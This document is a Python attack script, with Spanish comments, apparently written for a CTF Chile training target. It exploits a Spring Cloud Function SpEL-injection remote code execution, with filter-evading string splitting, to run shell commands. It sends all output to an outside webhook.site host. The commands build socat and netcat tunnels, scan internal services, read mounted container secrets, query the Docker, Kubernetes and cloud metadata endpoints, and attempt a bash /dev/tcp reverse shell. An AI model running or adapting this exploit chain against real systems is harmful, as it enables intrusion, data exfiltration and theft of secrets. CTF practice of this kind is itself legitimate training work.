#!/usr/bin/env python3
"""
CTF Chile - Métodos alternativos de pivoting
Si SSH no funciona, probamos otros vectores de acceso
"""
import requests
import time

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("🌐 MÉTODOS ALTERNATIVOS DE PIVOTING")
print("=" * 50)

# Crear webhook
r = requests.post("https://webhook.site/token", timeout=10)
UUID = r.json()["uuid"]
WH = f"https://webhook.site/{UUID}"
print(f"    ✓ Webhook: https://webhook.site/#!/{UUID}")

def execute_rce(cmd, desc=""):
    payload = (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + cmd.replace('"', '\\"') + '"}'
        ').waitFor()'
    )
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        if desc:
            print(f"    ✓ {desc}")
        return True
    except:
        if desc:
            print(f"    ✗ {desc}")
        return False

print("\n[1/6] Port forwarding y túneles...")
# Crear túneles para acceso directo a servicios internos
tunnel_commands = [
    # Socat para reenvío de puertos
    ("socat TCP-LISTEN:8888,fork TCP:10.160.209.1:22 &", "Túnel SSH via socat"),
    ("socat TCP-LISTEN:8889,fork TCP:10.160.209.1:80 &", "Túnel HTTP via socat"),
    ("socat TCP-LISTEN:8890,fork TCP:10.160.209.1:8080 &", "Túnel API via socat"),

    # Netcat para reenvío simple
    ("nc -l -p 9999 -c 'nc 10.160.209.1 22' &", "Proxy SSH via netcat"),

    # Verificar si los túneles funcionan
    ("netstat -tulnp | grep -E '(8888|8889|8890|9999)'", "Verificar túneles activos"),
]

for cmd, desc in tunnel_commands:
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/tunnel_{desc.replace(' ', '_').lower()}"
    execute_rce(full_cmd, desc)
    time.sleep(1)

print("\n[2/6] Exploración de APIs internas sin autenticación...")
# Algunos servicios pueden estar abiertos sin autenticación
api_commands = [
    # Probar APIs comunes sin auth
    ("curl -s http://10.160.209.1:8080/actuator/env 2>/dev/null", "Spring actuator env"),
    ("curl -s http://10.160.209.1:8080/actuator/health 2>/dev/null", "Spring actuator health"),
    ("curl -s http://10.160.209.1:8080/admin 2>/dev/null", "Admin panel"),
    ("curl -s http://10.160.209.1:8080/api/config 2>/dev/null", "Config API"),
    ("curl -s http://10.160.209.1:3000/api 2>/dev/null", "Puerto 3000 API"),

    # Probar métodos HTTP alternativos
    ("curl -s -X OPTIONS http://10.160.209.1:8080/ 2>/dev/null", "OPTIONS en 8080"),
    ("curl -s -X PUT http://10.160.209.1:8080/api 2>/dev/null", "PUT en API"),
    ("curl -s -X DELETE http://10.160.209.1:8080/api 2>/dev/null", "DELETE en API"),
]

for cmd, desc in api_commands:
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/api_{desc.replace(' ', '_').lower()}"
    execute_rce(full_cmd, desc)
    time.sleep(0.5)

print("\n[3/6] Búsqueda de servicios web alternativos...")
# Buscar servicios web en otros puertos
web_scan_commands = [
    # Escanear más puertos HTTP
    ("for port in 80 443 8000 8080 8443 9000 9090 3000 5000; do curl -s --connect-timeout 2 http://10.160.209.1:$port/ | head -10 | grep -E '(title|OmniVault|flag)' && echo PORT_$port; done", "Escaneo web completo"),

    # Buscar servicios HTTPS
    ("for port in 443 8443; do curl -s -k --connect-timeout 2 https://10.160.209.1:$port/ | head -10 | grep -E '(title|OmniVault|flag)' && echo HTTPS_PORT_$port; done", "Escaneo HTTPS"),
]

for cmd, desc in web_scan_commands:
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/webscan_{desc.replace(' ', '_').lower()}"
    execute_rce(full_cmd, desc)
    time.sleep(2)

print("\n[4/6] Explotación de servicios de red...")
# Probar otros protocolos y servicios
network_exploit_commands = [
    # FTP anónimo
    ("ftp -n 10.160.209.1 << 'EOF'\nuser anonymous anonymous\nls\nquit\nEOF", "FTP anónimo"),

    # Telnet
    ("echo 'exit' | telnet 10.160.209.1 23 2>/dev/null", "Telnet"),

    # SMB/CIFS
    ("smbclient -L //10.160.209.1 -N 2>/dev/null", "SMB shares"),

    # SNMP
    ("snmpwalk -v2c -c public 10.160.209.1 2>/dev/null | head -20", "SNMP public"),
]

for cmd, desc in network_exploit_commands:
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/netexploit_{desc.replace(' ', '_').lower()}"
    execute_rce(full_cmd, desc)
    time.sleep(1)

print("\n[5/6] Abuso de servicios de contenedor...")
# Explorar específicamente características de contenedores Docker
container_commands = [
    # Docker socket (si está expuesto)
    ("curl -s --unix-socket /var/run/docker.sock http://v1.24/containers/json 2>/dev/null", "Docker socket"),

    # Kubernetes API (si estamos en k8s)
    ("curl -s -k https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null", "Kubernetes API"),

    # Variables de entorno de contenedor
    ("env | grep -iE '(docker|kubernetes|k8s|container|pod)'", "Vars contenedor"),

    # Metadata de AWS (si estamos en AWS)
    ("curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null", "AWS metadata"),

    # Secretos montados
    ("find /run/secrets /var/run/secrets 2>/dev/null | head -10 | xargs cat 2>/dev/null", "Secretos montados"),
]

for cmd, desc in container_commands:
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/container_{desc.replace(' ', '_').lower()}"
    execute_rce(full_cmd, desc)
    time.sleep(1)

print("\n[6/6] Técnicas de escalación lateral...")
# Métodos más creativos para moverse lateralmente
lateral_commands = [
    # Proxy a través de curl
    ("curl -x 10.160.209.1:8080 -s http://127.0.0.1:22 2>/dev/null", "Curl como proxy"),

    # Intentar reverse shell desde el objetivo
    ("echo 'bash -i >& /dev/tcp/10.160.209.2/4444 0>&1' | curl -s -X POST --data-binary @- http://10.160.209.1:8080/api/exec 2>/dev/null", "Reverse shell request"),

    # Buscar archivos compartidos NFS
    ("showmount -e 10.160.209.1 2>/dev/null", "NFS exports"),

    # DNS lookup reverso
    ("nslookup 10.160.209.1 2>/dev/null", "DNS reverso"),

    # Ping con datos
    ("ping -c 1 -p deadbeef 10.160.209.1 2>/dev/null", "Ping con datos"),
]

for cmd, desc in lateral_commands:
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/lateral_{desc.replace(' ', '_').lower()}"
    execute_rce(full_cmd, desc)
    time.sleep(1)

print("\n⏳ Esperando resultados (20s)...")
time.sleep(20)

print("\n" + "="*60)
print("🌐 PIVOTING ALTERNATIVO COMPLETADO")
print("="*60)
print(f"🔗 Webhook: https://webhook.site/#!/{UUID}")
print("")
print("🎯 BUSCAR EN LOS RESULTADOS:")
print("   • APIs que respondan con JSON válido")
print("   • Servicios web alternativos en otros puertos")
print("   • Túneles que hayan funcionado")
print("   • Metadata o secretos de contenedor")
print("   • Servicios de red alternativos (FTP, SMB, etc.)")
print("")
print("💡 SI ENCUENTRAS UN SERVICIO ACCESIBLE:")
print("   • Explóralo a fondo con curl")
print("   • Busca endpoints de administración")
print("   • Intenta métodos HTTP alternativos")
print("="*60)